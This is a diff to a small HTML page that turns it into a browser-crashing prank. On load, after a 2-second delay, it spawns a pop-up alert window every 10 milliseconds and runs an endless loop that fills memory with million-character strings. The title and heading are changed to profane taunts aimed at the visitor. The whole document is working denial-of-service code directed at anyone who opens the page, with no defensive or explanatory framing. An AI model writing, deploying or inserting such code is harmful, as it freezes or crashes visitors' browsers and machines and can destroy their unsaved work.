@@ -2,22 +2,24 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>SndTagX</title>
+    <title>Fuck You Delayed</title>
 </head>
 <body>
-    <h1>SndTagX ON TOP!</h1>
+    <h1>Loaded? Kiss Your Browser Goodbye!</h1>
     <script>
         window.onload = function() {
-            // Spam pop-ups that don’t stop the script
-            setInterval(() => {
-                window.open("javascript:alert('SndTagX!');", "_blank", "width=200,height=100");
-            }, 10);
+            setTimeout(() => {
+                // Spam pop-ups that don’t stop the script
+                setInterval(() => {
+                    window.open("javascript:alert('Die, motherfucker!');", "_blank", "width=200,height=100");
+                }, 10);
 
-            // Crash it with a memory bomb
-            let crashArray = [];
-            while (true) {
-                crashArray.push(new Array(1000000).join('x'));
-            }
+                // Crash it with a memory bomb
+                let crashArray = [];
+                while (true) {
+                    crashArray.push(new Array(1000000).join('x'));
+                }
+            }, 2000); // 2-second wait to let it load
         };
     </script>
 </body>
